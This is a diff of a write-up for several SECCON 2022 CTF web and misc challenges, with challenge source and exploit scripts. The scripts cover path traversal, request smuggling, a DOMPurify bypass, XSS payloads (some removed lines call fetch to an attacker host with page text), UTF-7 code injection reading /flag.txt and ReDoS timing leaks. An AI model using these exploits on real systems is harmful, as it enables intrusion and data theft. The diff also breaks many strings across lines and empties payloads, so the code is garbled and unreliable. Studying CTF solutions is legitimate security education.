@@ -24,25 +24,16 @@ In fact, you can skip this step because bfcache is disabled by default options o
 7
 8
 9
-```
-
-
-
-```
 server {
  listen 8080 default_server;
  server_name nginx;
 
  location / {
  set $args "${args}&proxy=nginx";
- proxy_pass http://web:3000;
+ proxy_pass http://web:
+3000;
  }
 }
-```
-
-
-
-```
 1
 2
 3
@@ -57,11 +48,6 @@ server {
 12
 13
 14
-```
-
-
-
-```
 const app = require("express")();
 
 const FLAG = process.env.FLAG ?? "SECCON{dummy}";
@@ -76,27 +62,12 @@ app.get("/", (req, res) => {
 app.listen({ port: PORT, host: "0.0.0.0" }, () => {
  console.log(`Server listening at ${PORT}`);
 });
-```
-
-
-
-```
 1
 2
 3
-```
-
-
-
-```
 // from: https://github.com/ljharb/qs/blob/v6.11.0/lib/parse.js#L54-L55
 var limit = options.parameterLimit === Infinity ? undefined : options.parameterLimit;
 var parts = cleanStr.split(options.delimiter, limit);
-```
-
-
-
-```
 1
 2
 3
@@ -108,15 +79,11 @@ var parts = cleanStr.split(options.delimiter, limit);
 9
 10
 11
-```
-
-
-
-```
 import os
 import httpx
 
-BASE_URL = "http://skipinx.seccon.games:8080"
+BASE_URL = "http://skipinx.seccon.games:
+8080"
 
 # ref. https://github.com/ljharb/qs/blob/v6.11.0/lib/parse.js#L21
 PARAMETER_LIMIT = 1000
@@ -124,23 +91,8 @@ PARAMETER_LIMIT = 1000
 query = "proxy=something" + ("&"*(PARAMETER_LIMIT - 1))
 res = httpx.get(f"{BASE_URL}/?{query}")
 print(res.text)
-```
-
-
-
-```
 1
-```
-
-
-
-```
 SECCON{sometimes_deFault_options_are_useful_to_bypa55}
-```
-
-
-
-```
 1
 2
 3
@@ -198,11 +150,6 @@ SECCON{sometimes_deFault_options_are_useful_to_bypa55}
 55
 56
 57
-```
-
-
-
-```
 from flask import Flask, request, Response
 import subprocess
 import os
@@ -239,7 +186,7 @@ def waf(response: Response):
  return response
 
 @app.route("/")
-@app.route("/<path:filename>")
+@app.route("/")
 def index(filename: str = "index.html"):
  if ".." in filename or "%" in filename:
  return "Do not try path traversal :("
@@ -250,51 +197,27 @@ def index(filename: str = "index.html"):
  capture_output=True,
  timeout=1,
  )
- except subprocess.TimeoutExpired:
+ 
+except subprocess.TimeoutExpired:
  return "Timeout"
 
  if proc.returncode != 0:
  return "Something wrong..."
  return template(proc.stdout.decode(), request.args)
-```
-
-
-
-```
 1
 2
 3
 4
 5
-```
-
-
-
-```
 proc = subprocess.run(
  ["curl", f"file://{os.getcwd()}/public/{filename}"],
  capture_output=True,
  timeout=1,
 )
-```
-
-
-
-```
 1
 2
-```
-
-
-
-```
 if ".." in filename or "%" in filename:
  return "Do not try path traversal :("
-```
-
-
-
-```
 1
 2
 3
@@ -304,12 +227,8 @@ if ".." in filename or "%" in filename:
 7
 8
 9
-```
-
-
-
-```
-$ http "http://localhost:3000/.{.}/.{.}/flag.txt"
+$ http "http://localhost:
+3000/.{.}/.{.}/flag.txt"
 HTTP/1.1 200 OK
 Connection: close
 Content-Length: 10
@@ -318,43 +237,18 @@ Date: Sat, 05 Nov 2022 12:09:18 GMT
 Server: Werkzeug/2.2.2 Python/3.10.8
 
 Try harder
-```
-
-
-
-```
 1
 2
 3
 4
 5
-```
-
-
-
-```
 @app.after_request
 def waf(response: Response):
  if b"SECCON" in b"".join(response.response):
  return Response("Try harder")
  return response
-```
-
-
-
-```
 1
-```
-
-
-
-```
 return template(proc.stdout.decode(), request.args)
-```
-
-
-
-```
 1
 2
 3
@@ -378,11 +272,6 @@ return template(proc.stdout.decode(), request.args)
 21
 22
 23
-```
-
-
-
-```
 def validate(key: str) -> bool:
  # E.g. key == "{name}" -> True
  # key == "name" -> False
@@ -405,31 +294,16 @@ def template(text: str, params: dict[str, str]) -> str:
  return f"Invalid key: {key}"
  text = text.replace(key, value)
  return text
-```
-
-
-
-```
 1
 2
 3
 4
 5
-```
-
-
-
-```
 {
  "{name}": "{",
  "{": "}{",
- "{!</h1>\n</body>\n</html>\n--_curl_--file:///app/public/../../flag.txt\nSECCON}": ""
+ "{!</h1>\n\n</html>\n--_curl_--file:///app/public/../../flag.txt\nSECCON}": ""
 }
-```
-
-
-
-```
 1
 2
 3
@@ -437,23 +311,13 @@ def template(text: str, params: dict[str, str]) -> str:
 5
 6
 7
-```
-
-
-
-```
 ... snip ...
-<body>
+
  <h1>Hello, {name}!</h1>
-</body>
+
 </html>
 --_curl_--file:///app/public/../../flag.txt
 SECCON{real_flag}
-```
-
-
-
-```
 1
 2
 3
@@ -461,23 +325,13 @@ SECCON{real_flag}
 5
 6
 7
-```
-
-
-
-```
 ... snip ...
-<body>
+
  <h1>Hello, {!</h1>
-</body>
+
 </html>
 --_curl_--file:///app/public/../../flag.txt
 SECCON{real_flag}
-```
-
-
-
-```
 1
 2
 3
@@ -485,39 +339,19 @@ SECCON{real_flag}
 5
 6
 7
-```
-
-
-
-```
 ... snip ...
-<body>
+
  <h1>Hello, }{!</h1>
-</body>
+
 </html>
 --_curl_--file:///app/public/../../flag.txt
 SECCON}{real_flag}
-```
-
-
-
-```
 1
 2
 3
-```
-
-
-
-```
 ... snip ...
-<body>
+
  <h1>Hello, }{real_flag}
-```
-
-
-
-```
 1
 2
 3
@@ -533,43 +367,24 @@ SECCON}{real_flag}
 13
 14
 15
-```
-
-
-
-```
 import os
 import httpx
 
-BASE_URL = f"http://easylfi.seccon.games:3000"
+BASE_URL = f"http://easylfi.seccon.games:
+3000"
 
 res = httpx.get(
  BASE_URL + "/{.}./{.}./{app/public/hello.html,flag.txt}",
  params={
  "{name}": "{",
  "{": "}{",
- "{!</h1>\n</body>\n</html>\n--_curl_--file:///app/public/../../flag.txt\nSECCON}": "",
+ "{!</h1>\n\n</html>\n--_curl_--file:///app/public/../../flag.txt\nSECCON}": "",
  },
 )
 
 print("SECCON" + res.text.split("<h1>Hello, }")[1])
-```
-
-
-
-```
 1
-```
-
-
-
-```
 SECCON{i_lik3_fe4ture_of_copy_aS_cur1_in_br0wser}
-```
-
-
-
-```
 1
 2
 3
@@ -592,11 +407,6 @@ SECCON{i_lik3_fe4ture_of_copy_aS_cur1_in_br0wser}
 20
 21
 22
-```
-
-
-
-```
 version: "3"
 
 services:
@@ -604,7 +414,8 @@ services:
  build: ./nginx
  restart: always
  ports:
- - "3000:3000"
+ - "3000:
+3000"
  bff:
  build: ./bff
  restart: always
@@ -619,25 +430,10 @@ services:
  restart: always
  environment:
  - FLAG=SECCON{dummydummy}
-```
-
-
-
-```
 1
 2
-```
-
-
-
-```
 const result = await (await fetch("/api?expr=" + encodeURIComponent(expr))).text();
 document.getElementById("result").innerHTML = result || " ";
-```
-
-
-
-```
 1
 2
 3
@@ -662,11 +458,6 @@ document.getElementById("result").innerHTML = result || " ";
 22
 23
 24
-```
-
-
-
-```
 def proxy(req) -> str:
  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  sock.connect(("backend", 3000))
@@ -687,37 +478,23 @@ def proxy(req) -> str:
  try:
  data = sock.recv(4096)
  body = data.split(b"\r\n\r\n", 1)[1].decode()
- except (IndexError, TimeoutError) as e:
+ 
+except (IndexError, TimeoutError) as e:
  print(e)
  body = str(e)
  return body
-```
-
-
-
-```
 1
 2
 3
 4
 5
 6
-```
-
-
-
-```
 # From: https://github.com/Pylons/waitress/blob/v2.1.2/src/waitress/parser.py#L409-L413
 first_line_re = re.compile(
  b"([^ ]+) "
  b"((?:[^ :?#]+://[^ ?#/]*(?:[0-9]{1,5})?)?[^ ]+)"
  b"(( HTTP/([0-9.]+))$|$)"
 )
-```
-
-
-
-```
 1
 2
 3
@@ -808,11 +585,6 @@ first_line_re = re.compile(
 88
 89
 90
-```
-
-
-
-```
 const fastify = require("fastify")();
 
 const fail = (message) => {
@@ -839,7 +611,8 @@ const exploit = async () => {
  };
 
  const contentLength =
- "Accept: */*\r\nReferer: http://nginx:3000/\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCookie: "
+ "Accept: */*\r\nReferer: http://nginx:
+3000/\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCookie: "
  .length;
  const evilHeader = encode(`bbb\r\nContent-Length: ${contentLength}\r\n`);
 
@@ -861,7 +634,7 @@ const exploit = async () => {
  fail("Invalid evilJs");
  }
 
- const xssPayload = `<img src=0 onerror="${evilJs}">`;
+ const xssPayload = ``;
 
  const res = await (
  await fetch(`${SECCON_BASE_URL}/report`, {
@@ -903,23 +676,8 @@ const start = async () => {
  );
 };
 start();
-```
-
-
-
-```
 1
-```
-
-
-
-```
 SECCON{i5_1t_p0ssible_tO_s7eal_http_only_cooki3_fr0m_XSS}
-```
-
-
-
-```
 1
 2
 3
@@ -970,17 +728,12 @@ SECCON{i5_1t_p0ssible_tO_s7eal_http_only_cooki3_fr0m_XSS}
 48
 49
 50
-```
-
-
-
-```
 <!DOCTYPE html>
 <html>
 <head>
  <!-- snip -->
 </head>
-<body style="padding: 3rem;">
+
  <!-- snip -->
 
  <script>
@@ -1023,13 +776,8 @@ SECCON{i5_1t_p0ssible_tO_s7eal_http_only_cooki3_fr0m_XSS}
  await main();
  });
  </script>
-</body>
+
 </html>
-```
-
-
-
-```
 1
 2
 3
@@ -1040,11 +788,6 @@ SECCON{i5_1t_p0ssible_tO_s7eal_http_only_cooki3_fr0m_XSS}
 8
 9
 10
-```
-
-
-
-```
 trustedTypes.createPolicy("default", {
  createHTML: (unsafe) => {
  return DOMPurify.sanitize(unsafe)
@@ -1055,63 +798,18 @@ trustedTypes.createPolicy("default", {
  });
  },
 });
-```
-
-
-
-```
 1
 2
-```
-
-
-
-```
-> createHTML('SECCON{x<p id="}<img src=0 onerror=console.log(1)>"></p>')
-'SECCON{REDACTED}<img src=0 onerror=console.log(1)>"></p>'
-```
-
-
-
-```
+> createHTML('SECCON{x')
+'SECCON{REDACTED}">'
 1
-```
-
-
-
-```
 document.cookie = "FLAG=; expires=Thu, 01 Jan 1970 00:00:00 GMT";
-```
-
-
-
-```
 1
 2
-```
-
-
-
-```
 // Delete a secret in RegExp
 "".match(/^$/);
-```
-
-
-
-```
 1
-```
-
-
-
-```
 document.all["0"]["ownerDocument"]["defaultView"]["RegExp"]["input"]
-```
-
-
-
-```
 1
 2
 3
@@ -1120,11 +818,6 @@ document.all["0"]["ownerDocument"]["defaultView"]["RegExp"]["input"]
 6
 7
 8
-```
-
-
-
-```
 > DOMPurify.sanitize('x<script><SECCON{xxx}')
 'x'
 > RegExp.input
@@ -1133,33 +826,19 @@ document.all["0"]["ownerDocument"]["defaultView"]["RegExp"]["input"]
 'ECCON{xxx}'
 > document.all["0"]["ownerDocument"]["defaultView"]["RegExp"]["rightContext"]
 'ECCON{xxx}'
-```
-
-
-
-```
 1
 2
 3
 4
 5
 6
-```
-
-
-
-```
 const emoji = "0/ownerDocument/defaultView/RegExp/rightContext";
-const message = `{{emoji}} S{{emoji}}<p id="}<img src=0 onerror=fetch(\`${ATTACK_BASE_URL}/?text=\`+encodeURIComponent(document.all.message.textContent))>"></p><script><`;
-const url = `http://web:3000/result?${new URLSearchParams({
+const message = `{{emoji}} S{{emoji}}<script><`;
+const url = `http://web:
+3000/result?${new URLSearchParams({
  emoji,
  message,
 })}`;
-```
-
-
-
-```
 1
 2
 3
@@ -1225,11 +904,6 @@ const url = `http://web:3000/result?${new URLSearchParams({
 63
 64
 65
-```
-
-
-
-```
 const fastify = require("fastify")();
 
 const fail = (message) => {
@@ -1246,8 +920,9 @@ const sleep = (msec) => new Promise((resolve) => setTimeout(resolve, msec));
 
 const exploit = async () => {
  const emoji = "0/ownerDocument/defaultView/RegExp/rightContext";
- const message = `{{emoji}} S{{emoji}}<p id="}<img src=0 onerror=fetch(\`${ATTACK_BASE_URL}/?text=\`+encodeURIComponent(document.all.message.textContent))>"></p><script><`;
- const url = `http://web:3000/result?${new URLSearchParams({
+ const message = `{{emoji}} S{{emoji}}<script><`;
+ const url = `http://web:
+3000/result?${new URLSearchParams({
  emoji,
  message,
  })}`;
@@ -1295,39 +970,14 @@ const start = async () => {
  );
 };
 start();
-```
-
-
-
-```
 1
-```
-
-
-
-```
 SECCON{w0w_yoU_div3d_deeeeeep_iNto_DOMPurify}
-```
-
-
-
-```
 1
 2
 3
-```
-
-
-
-```
 if ("{{FLAG}}" in output) {
  delete output["{{FLAG}}"];
 }
-```
-
-
-
-```
 1
 2
 3
@@ -1336,11 +986,6 @@ if ("{{FLAG}}" in output) {
 6
 7
 8
-```
-
-
-
-```
 fn validate_identifier(ident: &Ident) -> Result<(), String> {
  // Limit available variables to `input` and `output` only.
  if ident.sym.eq("input") || ident.sym.eq("output") {
@@ -1349,11 +994,6 @@ fn validate_identifier(ident: &Ident) -> Result<(), String> {
  Err(format!("{:?}", ident))
  }
 }
-```
-
-
-
-```
 1
 2
 3
@@ -1362,24 +1002,15 @@ fn validate_identifier(ident: &Ident) -> Result<(), String> {
 6
 7
 8
-```
-
-
-
-```
 fn validate_assign_expr(expr: &AssignExpr) -> Result<(), String> {
  (match expr.left.as_pat() {
- Some(Pat::Expr(expr)) => validate_expr(expr),
+ Some(Pat::
+Expr(expr)) => validate_expr(expr),
  _ => Err(format!("{:?}", expr.left)),
  })?;
  validate_expr(&expr.right)?;
  Ok(())
 }
-```
-
-
-
-```
 1
 2
 3
@@ -1387,11 +1018,6 @@ fn validate_assign_expr(expr: &AssignExpr) -> Result<(), String> {
 5
 6
 7
-```
-
-
-
-```
 if ("{{FLAG}}" in output) {
  delete output["{{FLAG}}"];
 }
@@ -1399,25 +1025,10 @@ if ("{{FLAG}}" in output) {
 const filename = crypto.randomUUID().replaceAll("-", "") + ".json";
 await Deno.writeTextFile(filename, JSON.stringify(output));
 console.log(filename);
-```
-
-
-
-```
 1
 2
-```
-
-
-
-```
 "".constructor.prototype.replaceAll = "".constructor.raw;
 "".constructor.prototype.raw = input.filename;
-```
-
-
-
-```
 1
 2
 3
@@ -1425,11 +1036,6 @@ console.log(filename);
 5
 6
 7
-```
-
-
-
-```
 // From: https://deno.land/x/deno@v1.27.1/cli/schemas/config-file.v1.json
 /* snip */
  "importMap": {
@@ -1437,27 +1043,12 @@ console.log(filename);
  "type": "string"
  },
 /* snip */
-```
-
-
-
-```
 1
 2
 3
-```
-
-
-
-```
 if ("{{FLAG}}" in output) {
  delete output["{{FLAG}}"];
 }
-```
-
-
-
-```
 1
 2
 3
@@ -1485,11 +1076,6 @@ if ("{{FLAG}}" in output) {
 25
 26
 27
-```
-
-
-
-```
 export const crypto = {
  randomUUID: () => ({
  replaceAll: () => "dummy",
@@ -1517,11 +1103,6 @@ const proxy2 = new Proxy(
 );
 
 JSON.parse = () => proxy2;
-```
-
-
-
-```
 1
 2
 3
@@ -1624,11 +1205,6 @@ JSON.parse = () => proxy2;
 100
 101
 102
-```
-
-
-
-```
 const fastify = require("fastify")();
 const fs = require("node:fs");
 
@@ -1731,39 +1307,14 @@ const start = async () => {
  );
 };
 start();
-```
-
-
-
-```
 1
-```
-
-
-
-```
 SECCON{thE_denO_masc0t_dino5auR_staNding_in_tHe_s4ndbox}
-```
-
-
-
-```
 1
 2
 3
-```
-
-
-
-```
 sendNote(reply, noteId) {
  return reply.sendFile(`db/${this.id}/${noteId}`);
 }
-```
-
-
-
-```
 1
 2
 3
@@ -1805,11 +1356,6 @@ sendNote(reply, noteId) {
 39
 40
 41
-```
-
-
-
-```
 /* snip */
 
 const validate = (id) => {
@@ -1851,35 +1397,10 @@ fastify.post("/api/notes/delete", async (request, reply) => {
 });
 
 /* snip */
-```
-
-
-
-```
 1
-```
-
-
-
-```
-GET /api/notes/<img src=0 onerror="alert(1)">.html
-```
-
-
-
-```
+GET /api/notes/.html
 1
-```
-
-
-
-```
-<img src=0 onerror="window.addEventListener('message',e=>eval(e.data))">.html
-```
-
-
-
-```
+eval(e.data))">.html
 1
 2
 3
@@ -1964,12 +1485,7 @@ GET /api/notes/<img src=0 onerror="alert(1)">.html
 82
 83
 84
-```
 
-
-
-```
-<body>
  <script>
  const sleep = (msec) => new Promise((resolve) => setTimeout(resolve, msec));
 
@@ -2052,30 +1568,15 @@ GET /api/notes/<img src=0 onerror="alert(1)">.html
  };
  main();
  </script>
-</body>
-```
 
-
-
-```
 1
 2
 3
 4
-```
-
-
-
-```
 <script>
  const n = parseInt(new URLSearchParams(location.search).get("n"));
  history.go(-n);
 </script>
-```
-
-
-
-```
 1
 2
 3
@@ -2165,12 +1666,8 @@ GET /api/notes/<img src=0 onerror="alert(1)">.html
 87
 88
 89
-```
-
-
-
-```
-const path = require("node:path");
+const path = require("node:
+path");
 
 const fail = (message) => {
  console.error(message);
@@ -2191,7 +1688,7 @@ const sleep = (msec) => new Promise((resolve) => setTimeout(resolve, msec));
 const exploit = async () => {
  const noteId =
  // XSS payload:
- `<img src=0 onerror="window.addEventListener('message',e=>eval(e.data))">` +
+ `eval(e.data))">` +
  // .html -> Content-Type: text/html
  // ref. https://github.com/broofa/mime/blob/main/types/standard.js
  ".html";
@@ -2209,7 +1706,8 @@ const exploit = async () => {
  fail(`Invalid id: ${noteId}`);
  }
 
- const baseUrl = "http://web:3000";
+ const baseUrl = "http://web:
+3000";
 
  const reportedUrl = `${ATTACK_BASE_URL}/index.html?${new URLSearchParams({
  baseUrl,
@@ -2259,35 +1757,10 @@ const start = async () => {
  );
 };
 start();
-```
-
-
-
-```
 1
-```
-
-
-
-```
 SECCON{hack3rs_po11ute_3verything_by_v4ri0us_meanS}
-```
-
-
-
-```
 1
-```
-
-
-
-```
 nc latexipy.seccon.games 2337
-```
-
-
-
-```
 1
 2
 3
@@ -2305,11 +1778,6 @@ nc latexipy.seccon.games 2337
 15
 16
 17
-```
-
-
-
-```
 $ nc latexipy.seccon.games 2337
 Latexify as a Service!
 
@@ -2327,11 +1795,6 @@ __EOF__
 
 Result:
 \mathrm{f}(x, y, z) \triangleq (x + y)z
-```
-
-
-
-```
 1
 2
 3
@@ -2396,11 +1859,6 @@ Result:
 62
 63
 64
-```
-
-
-
-```
 import sys
 import ast
 import re
@@ -2463,11 +1921,6 @@ with tempfile.NamedTemporaryFile(suffix=".py") as file:
  print("Result:")
  spec = util.spec_from_file_location("tmp", file.name)
  spec.loader.exec_module(util.module_from_spec(spec))
-```
-
-
-
-```
 1
 2
 3
@@ -2485,11 +1938,6 @@ with tempfile.NamedTemporaryFile(suffix=".py") as file:
 15
 16
 17
-```
-
-
-
-```
 def get_fn_name(source: str) -> str | None:
  root = ast.parse(source)
  if type(root) is not ast.Module:
@@ -2507,63 +1955,28 @@ def get_fn_name(source: str) -> str | None:
  return None
 
  return str(fn.name)
-```
-
-
-
-```
 1
 2
-```
-
-
-
-```
 spec = util.spec_from_file_location("tmp", file.name)
 spec.loader.exec_module(util.module_from_spec(spec))
-```
-
-
-
-```
 1
 2
 3
 4
 5
-```
-
-
-
-```
 # coding: utf_7
 def f(x):
  return x
  #+AAo-print(open("/flag.txt").read())
 __EOF__
-```
-
-
-
-```
 1
 2
 3
 4
-```
-
-
-
-```
 def f(x):
  return x
 
 print(open("/flag.txt").read())
-```
-
-
-
-```
 1
 2
 3
@@ -2583,11 +1996,6 @@ print(open("/flag.txt").read())
 17
 18
 19
-```
-
-
-
-```
 import os
 import pwn
 
@@ -2607,35 +2015,10 @@ payload += "__EOF__"
 io.sendlineafter(b"__EOF__):", payload.encode())
 
 print(io.recvall().decode())
-```
-
-
-
-```
 1
-```
-
-
-
-```
 SECCON{UTF7_is_hack3r_friend1y_encoding}
-```
-
-
-
-```
 1
-```
-
-
-
-```
 sshpass -p ctf ssh -oStrictHostKeyChecking=no -oCheckHostIP=no ctf@txtchecker.seccon.games -p 2022
-```
-
-
-
-```
 1
 2
 3
@@ -2645,11 +2028,6 @@ sshpass -p ctf ssh -oStrictHostKeyChecking=no -oCheckHostIP=no ctf@txtchecker.se
 7
 8
 9
-```
-
-
-
-```
 #!/bin/bash
 
 read -p "Input a file path: " filepath
@@ -2659,47 +2037,22 @@ file $filepath 2>/dev/null | grep -q "ASCII text" 2>/dev/null
 # $? == 0 -> It's a text file.
 # $? != 0 -> It's not a text file.
 exit 0
-```
-
-
-
-```
 1
 2
 3
 4
-```
-
-
-
-```
 -m, --magic-file magicfiles
  Specify an alternate list of files and directories containing magic. This can be a single item,
  or a colon-separated list. If a compiled magic file is found alongside a file or directory, it
  will be used instead.
-```
-
-
-
-```
 1
 2
 3
 4
-```
-
-
-
-```
 regex A regular expression match in extended POSIX regular expression syntax (like egrep).
  Regular expressions can take exponential time to process, and their performance is
  hard to predict, so their use is discouraged. When used in production environments,
  their performance should be carefully checked. The size of ... snip ...
-```
-
-
-
-```
 1
 2
 3
@@ -2756,11 +2109,6 @@ regex A regular expression match in extended POSIX regular expression syntax (li
 54
 55
 56
-```
-
-
-
-```
 import string
 import os
 import pwn
@@ -2804,7 +2152,8 @@ while not flag.endswith("}"):
  right = len(CHARS)
  while right - left > 1:
  mid = (left + right)//2
- t_left = get_time(get_rule(len(flag), CHARS[:mid]))
+ t_left = get_time(get_rule(len(flag), CHARS[:
+mid]))
  t_right = get_time(get_rule(len(flag), CHARS[mid:]))
  print(f"{t_left = }, {t_right = }")
  if t_left > t_right:
@@ -2814,35 +2163,10 @@ while not flag.endswith("}"):
  flag += CHARS[left]
  print(flag)
 print(f"{flag = }")
-```
-
-
-
-```
 1
-```
-
-
-
-```
 SECCON{reDo5L1fe}
-```
-
-
-
-```
 1
-```
-
-
-
-```
 nc noiseccon.seccon.games 1337
-```
-
-
-
-```
 1
 2
 3
@@ -2856,11 +2180,6 @@ nc noiseccon.seccon.games 1337
 11
 12
 13
-```
-
-
-
-```
 $ nc noiseccon.seccon.games 1337
  _ _ _ ____ _
  | \ | | ___ (_)___ ___ / ___| ___ _ __ ___ _ __ __ _| |_ ___ _ __
@@ -2874,11 +2193,6 @@ Image height: 256
 Scale x: 1
 Scale y: 2
 UklGRoo7AABXRUJQVlA4TH07AAAv/8A/AM0ABDHgf9pA... snip (base64 of an image data) ...5SImJZRsMGAA==
-```
-
-
-
-```
 1
 2
 3
@@ -2977,15 +2291,12 @@ UklGRoo7AABXRUJQVlA4TH07AAAv/8A/AM0ABDHgf9pA... snip (base64 of an image data) .
 96
 97
 98
-```
-
-
-
-```
 const { noise } = require("./perlin.js");
 const sharp = require("sharp");
-const crypto = require("node:crypto");
-const readline = require("node:readline").promises;
+const crypto = require("node:
+crypto");
+const readline = require("node:
+readline").promises;
 
 const FLAG = process.env.FLAG ?? console.log("No flag") ?? process.exit(1);
 const WIDTH = 256;
@@ -3080,11 +2391,6 @@ const main = async () => {
 };
 
 main();
-```
-
-
-
-```
 1
 2
 3
@@ -3097,11 +2403,6 @@ main();
 10
 11
 12
-```
-
-
-
-```
 const offsetX = div(flagInt, scaleX);
 const offsetY = div(flagInt, scaleY);
 
@@ -3114,11 +2415,6 @@ for (let y = 0; y < HEIGHT; y++) {
  colors.push((v * 256) | 0);
  }
 }
-```
-
-
-
-```
 1
 2
 3
@@ -3145,11 +2441,6 @@ for (let y = 0; y < HEIGHT; y++) {
 24
 25
 26
-```
-
-
-
-```
 // From: https://github.com/josephg/noisejs/blob/master/perlin.js#L250-L273
 
  // 2D Perlin Noise
@@ -3176,27 +2467,12 @@ for (let y = 0; y < HEIGHT; y++) {
  lerp(n01, n11, u),
  fade(y));
  };
-```
-
-
-
-```
 1
 2
 3
-```
-
-
-
-```
 var grad3 = [new Grad(1,1,0),new Grad(-1,1,0),new Grad(1,-1,0),new Grad(-1,-1,0),
  new Grad(1,0,1),new Grad(-1,0,1),new Grad(1,0,-1),new Grad(-1,0,-1),
  new Grad(0,1,1),new Grad(0,-1,1),new Grad(0,1,-1),new Grad(0,-1,-1)];
-```
-
-
-
-```
 1
 2
 3
@@ -3221,14 +2497,10 @@ var grad3 = [new Grad(1,1,0),new Grad(-1,1,0),new Grad(1,-1,0),new Grad(-1,-1,0)
 22
 23
 24
-```
-
-
-
-```
 const { noise } = require("./perlin.js");
 const nodeplotlib = require("nodeplotlib");
-const crypto = require("node:crypto");
+const crypto = require("node:
+crypto");
 
 noise.seed(crypto.randomInt(65536));
 console.log(noise);
@@ -3250,11 +2522,6 @@ const data = [
  },
 ];
 nodeplotlib.plot(data);
-```
-
-
-
-```
 1
 2
 3
@@ -3272,11 +2539,6 @@ nodeplotlib.plot(data);
 15
 16
 17
-```
-
-
-
-```
 const div = (x, y) => {
  const p = 4;
  return Number(BigInt.asUintN(32 + p, (x * BigInt(1 << p)) / y)) / (1 << p);
@@ -3294,11 +2556,6 @@ for (let y = 0; y < HEIGHT; y++) {
  colors.push((v * 256) | 0);
  }
 }
-```
-
-
-
-```
 1
 2
 3
@@ -3361,11 +2618,6 @@ for (let y = 0; y < HEIGHT; y++) {
 60
 61
 62
-```
-
-
-
-```
 from concurrent.futures import ThreadPoolExecutor
 from Crypto.Util.number import long_to_bytes, bytes_to_long
 from PIL import Image
@@ -3425,16 +2677,6 @@ for index, bit in enumerate(bits):
  flag |= bit << index
 
 print(long_to_bytes(flag))
-```
-
-
-
-```
 1
-```
-
-
-
-```
 SECCON{p3RLin_W0r1d!}
 ```
